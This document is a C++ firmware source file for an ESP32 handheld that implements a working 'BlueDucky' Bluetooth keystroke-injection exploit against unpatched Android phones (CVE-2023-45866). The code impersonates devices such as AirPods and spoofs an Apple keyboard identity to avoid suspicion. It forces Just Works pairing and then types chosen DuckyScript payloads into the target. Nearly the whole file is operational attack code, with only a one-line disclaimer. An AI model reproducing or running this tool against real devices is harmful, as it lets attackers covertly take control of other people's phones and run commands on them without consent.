/*
 * ble_blueducky — BLE HID keystroke injection (BlueDucky-style).
 *
 * Advertises as a BLE HID keyboard with a phone-friendly name. On
 * unpatched Android (CVE-2023-45866, fixed Dec 2023 patch level), the
 * BLE HID stack accepts input reports without requiring pairing — the
 * target auto-binds the moment we advertise + reply to its connect.
 *
 * Once "connected", the chosen DuckyScript-lite payload is driven into
 * the target as a stream of BLE HID input reports. Typing cadence is
 * capped around 30-50 keys/sec so the Android input queue doesn't drop
 * keys.
 *
 * Payload source: BADUSB_ANDROID_PAYLOADS in badusb_extras.h (Android-
 * targeted DuckyScripts) plus the prank library.
 *
 * Credits / prior art:
 *   - BlueDucky (pentestfunctions): the original PoC.
 *   - Marc Newlin (SkySafe): CVE-2023-45866 discovery.
 *   - NimBLE-Arduino HID demos.
 *
 * Personal-use disclaimer: do not point this at devices you don't own.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "ble_blueducky.h"
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include <HIDTypes.h>
#include <HIDKeyboardTypes.h>
#include <esp_wifi.h>

/* The OS-payload arrays in badusb_extras.h require payload_t to be in
 * scope (it's defined in badusb.cpp, not the header). prank_t is
 * defined inside badusb_pranks_data.h itself. We re-declare payload_t
 * with the same shape so the include drops in cleanly. */
struct payload_t { const char *name; const char *script; };
#include "badusb_extras.h"
#include "badusb_pranks_data.h"

/* ===== HID report descriptor (mirrors ble_hid.cpp) ===== */
static const uint8_t BD_REPORT_MAP[] = {
    USAGE_PAGE(1),       0x01,
    USAGE(1),            0x06,
    COLLECTION(1),       0x01,
    REPORT_ID(1),        0x01,
    USAGE_PAGE(1),       0x07,
    USAGE_MINIMUM(1),    0xE0,
    USAGE_MAXIMUM(1),    0xE7,
    LOGICAL_MINIMUM(1),  0x00,
    LOGICAL_MAXIMUM(1),  0x01,
    REPORT_SIZE(1),      0x01,
    REPORT_COUNT(1),     0x08,
    HIDINPUT(1),         0x02,
    REPORT_COUNT(1),     0x01,
    REPORT_SIZE(1),      0x08,
    HIDINPUT(1),         0x01,
    REPORT_COUNT(1),     0x06,
    REPORT_SIZE(1),      0x08,
    LOGICAL_MINIMUM(1),  0x00,
    LOGICAL_MAXIMUM(1),  0x65,
    USAGE_PAGE(1),       0x07,
    USAGE_MINIMUM(1),    0x00,
    USAGE_MAXIMUM(1),    0x65,
    HIDINPUT(1),         0x00,
    END_COLLECTION(0),
};

static NimBLEHIDDevice      *s_hid       = nullptr;
static NimBLECharacteristic *s_input     = nullptr;
static volatile bool         s_connected = false;
static char                  s_peer_mac[20] = {0};

/* Inter-keystroke gap. ~22ms gives ~45 keys/sec which lands in the
 * sweet spot — fast enough to feel snappy, slow enough that Android's
 * input dispatcher doesn't coalesce or drop. */
#ifndef BD_KEY_GAP_MS
#define BD_KEY_GAP_MS 22
#endif

/* ===== HID modifier bitmask ===== */
#define BD_MOD_LCTRL   0x01
#define BD_MOD_LSHIFT  0x02
#define BD_MOD_LALT    0x04
#define BD_MOD_LGUI    0x08

struct bd_cb : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer *, NimBLEConnInfo &ci) override
    {
        s_connected = true;
        /* getAddress() returns a NimBLEAddress; toString() is std::string. */
        NimBLEAddress a = ci.getAddress();
        strncpy(s_peer_mac, a.toString().c_str(), sizeof(s_peer_mac) - 1);
        s_peer_mac[sizeof(s_peer_mac) - 1] = '\0';
    }
    void onDisconnect(NimBLEServer *, NimBLEConnInfo &, int) override
    {
        s_connected = false;
        s_peer_mac[0] = '\0';
        NimBLEDevice::startAdvertising();
    }
};
static bd_cb s_cb;

/* ===== ASCII -> HID usage ===== */
static uint8_t ascii_to_hid(char c, uint8_t *mod)
{
    *mod = 0;
    if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 0x04);
    if (c >= 'A' && c <= 'Z') { *mod = BD_MOD_LSHIFT; return (uint8_t)(c - 'A' + 0x04); }
    if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 0x1E);
    switch (c) {
    case '0': return 0x27;
    case '\n': case '\r': return 0x28;
    case ' ': return 0x2C;
    case '-': return 0x2D;
    case '=': return 0x2E;
    case '[': return 0x2F;
    case ']': return 0x30;
    case '\\': return 0x31;
    case ';': return 0x33;
    case '\'': return 0x34;
    case '`': return 0x35;
    case ',': return 0x36;
    case '.': return 0x37;
    case '/': return 0x38;
    case '\t': return 0x2B;
    /* Shifted symbols */
    case '!': *mod = BD_MOD_LSHIFT; return 0x1E;
    case '@': *mod = BD_MOD_LSHIFT; return 0x1F;
    case '#': *mod = BD_MOD_LSHIFT; return 0x20;
    case '$': *mod = BD_MOD_LSHIFT; return 0x21;
    case '%': *mod = BD_MOD_LSHIFT; return 0x22;
    case '^': *mod = BD_MOD_LSHIFT; return 0x23;
    case '&': *mod = BD_MOD_LSHIFT; return 0x24;
    case '*': *mod = BD_MOD_LSHIFT; return 0x25;
    case '(': *mod = BD_MOD_LSHIFT; return 0x26;
    case ')': *mod = BD_MOD_LSHIFT; return 0x27;
    case '_': *mod = BD_MOD_LSHIFT; return 0x2D;
    case '+': *mod = BD_MOD_LSHIFT; return 0x2E;
    case '{': *mod = BD_MOD_LSHIFT; return 0x2F;
    case '}': *mod = BD_MOD_LSHIFT; return 0x30;
    case '|': *mod = BD_MOD_LSHIFT; return 0x31;
    case ':': *mod = BD_MOD_LSHIFT; return 0x33;
    case '"': *mod = BD_MOD_LSHIFT; return 0x34;
    case '~': *mod = BD_MOD_LSHIFT; return 0x35;
    case '<': *mod = BD_MOD_LSHIFT; return 0x36;
    case '>': *mod = BD_MOD_LSHIFT; return 0x37;
    case '?': *mod = BD_MOD_LSHIFT; return 0x38;
    }
    return 0;
}

/* Token (ENTER, TAB, ESC, etc) -> HID usage. */
static uint8_t token_to_hid(const char *k)
{
    if (!k || !*k) return 0;
    if (strlen(k) == 1) {
        uint8_t mod;
        return ascii_to_hid(k[0], &mod);
    }
    if (!strcasecmp(k, "ENTER")) return 0x28;
    if (!strcasecmp(k, "TAB"))   return 0x2B;
    if (!strcasecmp(k, "ESC"))   return 0x29;
    if (!strcasecmp(k, "SPACE")) return 0x2C;
    if (!strcasecmp(k, "BKSP"))  return 0x2A;
    if (!strcasecmp(k, "DEL"))   return 0x4C;
    if (!strcasecmp(k, "UP"))    return 0x52;
    if (!strcasecmp(k, "DOWN"))  return 0x51;
    if (!strcasecmp(k, "LEFT"))  return 0x50;
    if (!strcasecmp(k, "RIGHT")) return 0x4F;
    if (!strcasecmp(k, "HOME"))  return 0x4A;
    if (!strcasecmp(k, "END"))   return 0x4D;
    if (!strcasecmp(k, "F1"))    return 0x3A;
    if (!strcasecmp(k, "F2"))    return 0x3B;
    if (!strcasecmp(k, "F3"))    return 0x3C;
    if (!strcasecmp(k, "F4"))    return 0x3D;
    if (!strcasecmp(k, "F5"))    return 0x3E;
    if (!strcasecmp(k, "F6"))    return 0x3F;
    if (!strcasecmp(k, "F7"))    return 0x40;
    if (!strcasecmp(k, "F8"))    return 0x41;
    if (!strcasecmp(k, "F9"))    return 0x42;
    if (!strcasecmp(k, "F10"))   return 0x43;
    if (!strcasecmp(k, "F11"))   return 0x44;
    if (!strcasecmp(k, "F12"))   return 0x45;
    return 0;
}

/* ===== Stats ===== */
static volatile uint32_t s_keys_sent  = 0;
static volatile int      s_lines_sent = 0;

/* Lowest-level send: emit a 'press' report then a 'release' report.
 * Returns true if both made it through to the link. */
static bool bd_emit(uint8_t key, uint8_t mod)
{
    if (!s_input || !s_connected) return false;
    uint8_t rpt[8] = { mod, 0, key, 0, 0, 0, 0, 0 };
    s_input->setValue(rpt, sizeof(rpt));
    s_input->notify();
    delay(BD_KEY_GAP_MS / 2);
    memset(rpt, 0, sizeof(rpt));
    s_input->setValue(rpt, sizeof(rpt));
    s_input->notify();
    delay(BD_KEY_GAP_MS / 2);
    s_keys_sent++;
    return true;
}

static void bd_type_string(const char *s)
{
    for (; *s; ++s) {
        uint8_t mod = 0;
        uint8_t k = ascii_to_hid(*s, &mod);
        if (k && s_connected) bd_emit(k, mod);
        if (!s_connected) return;
    }
}

/* ===== modifier name -> bit ===== */
static uint8_t modbit(const char *t)
{
    if (!t) return 0;
    if (!strcasecmp(t, "GUI") || !strcasecmp(t, "WIN") || !strcasecmp(t, "WINDOWS")) return BD_MOD_LGUI;
    if (!strcasecmp(t, "CTRL")  || !strcasecmp(t, "CONTROL")) return BD_MOD_LCTRL;
    if (!strcasecmp(t, "ALT"))    return BD_MOD_LALT;
    if (!strcasecmp(t, "SHIFT"))  return BD_MOD_LSHIFT;
    return 0;
}

/* Run a single DuckyScript-lite line. Mirrors badusb.cpp's exec_line()
 * but emits BLE HID reports instead of USB ones. */
static void bd_exec_line(const char *line)
{
    while (*line == ' ' || *line == '\t') ++line;
    if (!*line || *line == '\n' || *line == '\r') return;
    char buf[160];
    strncpy(buf, line, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    for (int i = strlen(buf) - 1; i >= 0 && (buf[i] == '\r' || buf[i] == '\n'); --i) buf[i] = 0;

    char *cmd = strtok(buf, " ");
    if (!cmd) return;
    char *arg = strtok(nullptr, "");

    if (!strcasecmp(cmd, "REM"))    return;
    if (!strcasecmp(cmd, "DELAY"))  { delay(arg ? atoi(arg) : 100); return; }
    if (!strcasecmp(cmd, "STRING")) { if (arg) bd_type_string(arg); return; }
    if (!strcasecmp(cmd, "ENTER"))  { bd_emit(0x28, 0); return; }
    if (!strcasecmp(cmd, "TAB"))    { bd_emit(0x2B, 0); return; }
    if (!strcasecmp(cmd, "ESC"))    { bd_emit(0x29, 0); return; }
    if (!strcasecmp(cmd, "SPACE"))  { bd_emit(0x2C, 0); return; }
    if (!strcasecmp(cmd, "BKSP"))   { bd_emit(0x2A, 0); return; }

    /* Modifier-chord forms — accept up to 2 modifiers + final key. */
    uint8_t first = modbit(cmd);
    if (first) {
        uint8_t mods = first;
        const char *tail = arg;
        if (!tail || !*tail) {
            /* Bare modifier: tap it. */
            bd_emit(0, mods);
            return;
        }
        /* arg may be "ALT t" (second modifier + key) or just "r" (key). */
        char tbuf[32];
        strncpy(tbuf, tail, sizeof(tbuf) - 1);
        tbuf[sizeof(tbuf) - 1] = '\0';
        char *tok = strtok(tbuf, " ");
        if (!tok) { bd_emit(0, mods); return; }
        uint8_t second = modbit(tok);
        const char *final_tok = tok;
        if (second) {
            mods |= second;
            final_tok = strtok(nullptr, " ");
        }
        if (final_tok && *final_tok) {
            uint8_t k = token_to_hid(final_tok);
            if (k) bd_emit(k, mods);
        } else {
            bd_emit(0, mods);
        }
        return;
    }
}

/* ===== UI helpers ===== */
static const char *s_disguises[] = {
    "Magic Keyboard", "Logitech K380", "Galaxy Buds2 Pro",
    "AirPods Pro", "JBL Flip 6", "Pixel Buds Pro",
};
#define BD_DISG_N (sizeof(s_disguises) / sizeof(s_disguises[0]))

/* Scrollable picker (same convention as badusb.cpp::pick_list_scrollable). */
static int bd_pick_list(const char *title,
                        const char *footer_hint,
                        int count,
                        const char *(*get_name)(int idx, void *ctx),
                        const char *(*get_blurb)(int idx, void *ctx),
                        void *ctx)
{
    int cursor = 0;
    int top = 0;
    const int rows = LIST_ROWS(18, 12);   /* fill the panel: was hardcoded for the 113px Cardputer body */
    const int row_h = 11;
    auto &d = M5Cardputer.Display;
    int last_top = -1, last_cursor = -1;

    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print(title);
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    ui_draw_footer(footer_hint);

    while (true) {
        if (cursor < top)         top = cursor;
        if (cursor >= top + rows) top = cursor - rows + 1;

        if (top != last_top || cursor != last_cursor) {
            for (int i = 0; i < rows; ++i) {
                int idx = top + i;
                int y = BODY_Y + 18 + i * row_h;
                if (idx >= count) {
                    d.fillRect(0, y - 1, SCR_W, row_h, T_BG);
                    continue;
                }
                if (idx == cursor) {
                    d.fillRect(0, y - 1, SCR_W, row_h, T_SEL_BG);
                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
                } else {
                    d.fillRect(0, y - 1, SCR_W, row_h, T_BG);
                }
                d.setTextColor(idx == cursor ? T_FG : T_DIM, idx == cursor ? T_SEL_BG : T_BG);
                d.setCursor(6, y);
                char buf[34];
                snprintf(buf, sizeof(buf), "%-30s", get_name(idx, ctx));
                d.print(buf);
            }
            if (get_blurb && cursor < count) {
                int by = BODY_Y + 18 + rows * row_h + 2;
                d.fillRect(0, by, SCR_W, 18, T_BG);
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, by + 2);
                const char *b = get_blurb(cursor, ctx);
                if (b) {
                    char trim[42];
                    snprintf(trim, sizeof(trim), "%.40s", b);
                    d.print(trim);
                }
            }
            last_top = top;
            last_cursor = cursor;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC)                       return -1;
        if (k == PK_ENTER || k == ' ')         return cursor;
        if (k == ';' || k == PK_UP)            { if (cursor > 0) cursor--; }
        else if (k == '.' || k == PK_DOWN)     { if (cursor + 1 < count) cursor++; }
    }
}

/* ===== Payload source: combined Android library + pranks ===== */
struct bd_entry { const char *name; const char *script; const char *src; };

static bd_entry s_combined[64];
static int      s_combined_n = 0;

static void bd_build_combined(void)
{
    s_combined_n = 0;
    for (size_t i = 0; i < BADUSB_ANDROID_N && s_combined_n < (int)(sizeof(s_combined)/sizeof(s_combined[0])); ++i) {
        s_combined[s_combined_n++] = {
            BADUSB_ANDROID_PAYLOADS[i].name,
            BADUSB_ANDROID_PAYLOADS[i].script,
            "android"
        };
    }
    /* Add a curated slice of pranks — first 8 entries from PRANK_CLASSIC
     * if it exists, else first category. Keeps the list focused on things
     * that work well via BLE HID (no admin-only / Windows-only chords). */
    if (PRANK_CATEGORIES_N > 0) {
        size_t cap = 8;
        size_t take = PRANK_CATEGORIES[PRANK_CATEGORIES_N - 1].count;
        if (take > cap) take = cap;
        const prank_t *items = PRANK_CATEGORIES[PRANK_CATEGORIES_N - 1].items;
        for (size_t i = 0; i < take && s_combined_n < (int)(sizeof(s_combined)/sizeof(s_combined[0])); ++i) {
            s_combined[s_combined_n++] = { items[i].name, items[i].script, "prank" };
        }
    }
}

static const char *bd_entry_name(int i, void *)
{
    static char buf[40];
    snprintf(buf, sizeof(buf), "[%s] %s", s_combined[i].src, s_combined[i].name);
    return buf;
}

/* ===== HID setup / teardown ===== */
static void bd_setup_hid(const char *name)
{
    /* Release WiFi heap before NimBLE + HID GATT server init. The HID
     * GATT server needs ~10 KB on top of NimBLE's ~60 KB and won't
     * fit otherwise on Cardputer-Adv (ESP32-S3FN8, no PSRAM). Same
     * trade-off as Bad-KB: WiFi features dead until reboot after
     * BlueDucky runs. Without this, ble_gatts_start returns rc=6
     * (ENOMEM) and BlueDucky hangs at "advertising..." forever. */
    esp_wifi_stop();
    esp_wifi_deinit();
    NimBLEDevice::init(name);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    /* CVE-2023-45866 hinges on the target accepting reports without a
     * proper bond. Advertise as "no input/output" so Just Works is the
     * only option; on unpatched Android the HID stack accepts input
     * before the pairing dialog is ever confirmed. */
    NimBLEDevice::setSecurityAuth(true, false, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

    NimBLEServer *srv = NimBLEDevice::createServer();
    srv->setCallbacks(&s_cb);

    s_hid = new NimBLEHIDDevice(srv);
    s_input = s_hid->getInputReport(1);
    s_hid->setManufacturer("POSEIDON");
    /* Spoof Apple Magic Keyboard PnP so the host doesn't get suspicious. */
    s_hid->setPnp(0x02, 0x05AC, 0x820A, 0x0210);
    s_hid->setHidInfo(0x00, 0x01);
    s_hid->setReportMap((uint8_t *)BD_REPORT_MAP, sizeof(BD_REPORT_MAP));
    s_hid->startServices();

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    adv->setAppearance(HID_KEYBOARD);
    adv->addServiceUUID(s_hid->getHidService()->getUUID());
    adv->start();
}

/* ===== Status panel ===== */
/* Static chrome (title + rule + payload name) is painted once on the
 * first call / on `force`. Subsequent calls overwrite only the live
 * fields (peer, counters, state) padded over their own background, so
 * the panel never blanks-then-repaints. */
static bool     s_bd_status_init = false;
static char     s_bd_last_peer[24] = {0};
static char     s_bd_last_state[40] = {0};
static int      s_bd_last_lines = -1;
static uint32_t s_bd_last_keys = 0xFFFFFFFF;
static uint16_t s_bd_last_color = 0;

static void bd_draw_status_force(const char *payload_name, const char *state,
                                 uint16_t color, bool force)
{
    auto &d = M5Cardputer.Display;
    if (force || !s_bd_status_init) {
        d.fillRect(0, BODY_Y, SCR_W, 80, T_BG);
        d.setTextColor(T_ACCENT, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("BLUEDUCKY");
        d.drawFastHLine(4, BODY_Y + 12, 110, T_ACCENT);
        d.setTextColor(T_FG, T_BG);
        d.setCursor(4, BODY_Y + 18);
        d.printf("pld: %.22s", payload_name);
        s_bd_status_init = true;
        s_bd_last_peer[0] = '\0';
        s_bd_last_state[0] = '\0';
        s_bd_last_lines = -1;
        s_bd_last_keys = 0xFFFFFFFF;
        s_bd_last_color = 0;
    }

    const char *peer = s_connected && s_peer_mac[0] ? s_peer_mac : "(none)";
    if (strncmp(peer, s_bd_last_peer, sizeof(s_bd_last_peer)) != 0) {
        ui_text_w(4, BODY_Y + 30, SCR_W - 8, s_connected ? T_GOOD : T_WARN, "peer: %s", peer);
        strncpy(s_bd_last_peer, peer, sizeof(s_bd_last_peer) - 1);
        s_bd_last_peer[sizeof(s_bd_last_peer) - 1] = '\0';
    }
    if (s_lines_sent != s_bd_last_lines || s_keys_sent != s_bd_last_keys) {
        ui_text_w(4, BODY_Y + 42, SCR_W - 8, T_DIM, "lines:%d  keys:%lu",
                  s_lines_sent, (unsigned long)s_keys_sent);
        s_bd_last_lines = s_lines_sent;
        s_bd_last_keys = s_keys_sent;
    }
    if (color != s_bd_last_color || strncmp(state, s_bd_last_state, sizeof(s_bd_last_state)) != 0) {
        ui_text_w(4, BODY_Y + 54, SCR_W - 8, color, "%s", state);
        s_bd_last_color = color;
        strncpy(s_bd_last_state, state, sizeof(s_bd_last_state) - 1);
        s_bd_last_state[sizeof(s_bd_last_state) - 1] = '\0';
    }
}

static void bd_draw_status(const char *payload_name, const char *state, uint16_t color)
{
    bd_draw_status_force(payload_name, state, color, false);
}

/* Wait for the target to accept the advertisement / Just-Works bond.
 * Returns true if connected within `timeout_ms`. */
static bool bd_wait_connect(const char *payload_name, uint32_t timeout_ms)
{
    uint32_t t0 = millis();
    uint32_t last_blink = 0;
    int dots = 0;
    while (!s_connected && (millis() - t0) < timeout_ms) {
        if (millis() - last_blink > 250) {
            last_blink = millis();
            dots = (dots + 1) % 4;
            char wait_msg[40];
            snprintf(wait_msg, sizeof(wait_msg), "advertising%s", "...." + (4 - dots));
            bd_draw_status(payload_name, wait_msg, T_WARN);
            ui_draw_status("blueducky", "adv");
        }
        uint16_t k = input_poll();
        if (k == PK_ESC) return false;
        delay(30);
    }
    return s_connected;
}

/* Run a DuckyScript-lite payload over the BLE HID link. */
static void bd_run_payload(const char *name, const char *script)
{
    s_keys_sent = 0;
    s_lines_sent = 0;
    bd_draw_status(name, "running...", T_BAD);
    ui_draw_footer("`=abort");
    ui_draw_status("blueducky", "run");

    const char *p = script;
    int ln = 0;
    while (*p && s_connected) {
        const char *eol = strchr(p, '\n');
        int len = eol ? (int)(eol - p) : (int)strlen(p);
        char line[160];
        int n = len < 159 ? len : 159;
        memcpy(line, p, n);
        line[n] = '\0';

        ln++;
        s_lines_sent = ln;

        /* Live HUD: redraw status line every few lines. */
        if ((ln & 0x03) == 0) bd_draw_status(name, "running...", T_BAD);

        bd_exec_line(line);

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (!eol) break;
        p = eol + 1;
    }

    if (s_connected) {
        bd_draw_status(name, "DONE", T_GOOD);
        ui_toast("done", T_GOOD, 700);
    } else {
        bd_draw_status(name, "LINK LOST", T_BAD);
        ui_toast("link lost", T_BAD, 700);
    }
}

/* ===== Info splash ===== */
static void bd_show_info(void)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BLUEDUCKY");
    d.drawFastHLine(4, BODY_Y + 12, 110, T_BAD);
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 18);  d.print("CVE-2023-45866");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 30);  d.print("Android <Dec 2023 patch.");
    d.setCursor(4, BODY_Y + 40);  d.print("BLE HID accepts reports");
    d.setCursor(4, BODY_Y + 50);  d.print("without pair confirm.");
    d.setCursor(4, BODY_Y + 62);  d.print("credit: BlueDucky / SkySafe");
    ui_draw_footer("any key = continue");
    while (input_poll() == PK_NONE) delay(30);
}

/* ===== Entry point ===== */
void feat_ble_blueducky(void)
{
    /* Drop into the BLE domain. radio.cpp keeps BTDM memory pinned via
     * the btInUse() override in main.cpp, so this is safe. */
    radio_switch(RADIO_NONE);

    bd_show_info();

    /* Pick disguise. */
    int disg = (int)(millis() % BD_DISG_N);
    {
        const char *(*name_fn)(int, void *) = [](int i, void *) -> const char * {
            return s_disguises[i];
        };
        int p = bd_pick_list("BLUEDUCKY / DISGUISE",
                             ";/.=move  ENTER=pick  `=back",
                             (int)BD_DISG_N, name_fn, nullptr, nullptr);
        if (p < 0) return;
        disg = p;
    }

    /* Pick payload (combined Android + last prank category). */
    bd_build_combined();
    if (s_combined_n == 0) {
        ui_toast("no payloads", T_BAD, 800);
        return;
    }
    int pick = bd_pick_list("BLUEDUCKY / PAYLOAD",
                            ";/.=move  ENTER=fire  `=back",
                            s_combined_n, bd_entry_name, nullptr, nullptr);
    if (pick < 0) return;

    const char *pname  = s_combined[pick].name;
    const char *script = s_combined[pick].script;

    /* Bring up advertising. */
    bd_setup_hid(s_disguises[disg]);
    s_bd_status_init = false;
    bd_draw_status_force(pname, "advertising...", T_WARN, true);

    /* Wait up to 30s for the target to bond. */
    if (!bd_wait_connect(pname, 30000)) {
        bd_draw_status(pname, "TIMEOUT", T_BAD);
        ui_toast("no target", T_WARN, 900);
    } else {
        /* Brief settle so the HID descriptor finishes binding on the host. */
        delay(800);
        bd_run_payload(pname, script);
    }

    /* Idle on the result panel until user dismisses. */
    ui_draw_footer("`=back");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        delay(30);
    }

    /* Stop advertising; leave NimBLE up for radio_switch() teardown. */
    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    if (adv) adv->stop();
    s_connected = false;
    s_peer_mac[0] = '\0';
    /* Release the heap-allocated HIDDevice to avoid leaking ~1-2 KB
     * on every BlueDucky entry. The NimBLE server is owned by
     * NimBLEDevice and torn down on deinit. */
    if (s_hid) { delete s_hid; s_hid = nullptr; }
    s_input = nullptr;
}
